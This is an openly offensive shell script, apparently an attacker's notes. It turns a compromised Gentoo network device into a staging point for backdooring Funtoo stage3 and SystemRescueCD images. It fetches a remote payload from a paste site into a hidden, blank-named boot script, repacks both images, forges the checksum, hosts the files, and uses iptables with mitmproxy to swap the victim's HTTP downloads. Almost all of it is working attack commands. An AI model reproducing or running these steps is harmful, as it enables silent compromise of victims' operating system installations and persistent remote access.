################pwn the network device (IPS in this case,vulnerable software - Elasticsearch) ###
#target OS: gentoo  (hostname: SURI)

#obviously it does not have to be Elasticsearch it could be any software with remote-root vuln

#################### setup backdoor env.

emerge pip cdrtools #include openssl,netcat,wget here if they aren't installed
pip install mitmproxy twisted

#ideally you will set this up on your own system and just wget the backdoored stage3 and iso
#however in this case I will use the compromised network device to setup the backdoored files.

mkdir work
cd work
mkdir backdoor-stage3 backdoor-iso-ro backdoor-iso-rw out

wget http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/stage3-latest.tar.xz #replace with current stage3 url
wget http://build.funtoo.org/distfiles/sysresccd/systemrescuecd-x86-4.7.1.iso

mount -oloop ./systemrescuecd-x86-4.7.1.iso ./backdoor-iso-ro
cp -a ./backdoor-iso-ro/* ./backdoor-iso-rw/
tar -C backdoor-stage3 -xvf ./stage3-latest.tar.xz
unsquashfs -d ./backdoor-squash/ ./backdoor-iso-ro/sysrcd.dat

curl --insecure https://bpaste.net/raw/3cea6ab189d8 > backdoor-stage3/etc/local.d/' '
cp backdoor-stage3/etc/local.d/' ' ./backdoor-squash/etc/local.d/' '

chmod a+x ./backdoor-stag3/etc/local.d/' '
chmod a+x ./backdoor-squash/etc/local.d/' '

cd backdoor-squash

##pack backdoored files

cd backdoor-stage3
tar -cJf ../out/stage3-latest.tar.xz *
cd ../backdoor-squash
mksquashfs ./* ../sysrcd-backdoored.dat
cd ../backdoor-iso-rw

rm sysrcd*
mv ../sysrcd-backdoored.dat ./sysrcd.dat
md5sum sysrcd.dat > sysrcd.md5
mkisofs -o ../out/systemrescuecd-x86-4.7.1.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V 
systemrescuecd-x86-4.7.1 .

cd ..;ls -l out
########start and fork twisted web server to host the backdoored files###
twistd -n web -p 80 --path out&

####setup mitmproxy/mitmdump
#pick victim IP, find what interface it is on, setup iptables rules accordingly for the interface
#victim:172.16.10.81
# ip neigh show to 172.16.10.81 
#172.16.10.81 dev eth1 lladdr ac:ef:ac:e0:c3:01 REACHABLE

iptables -t nat -A PREROUTING -i eth1 -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080


#profit

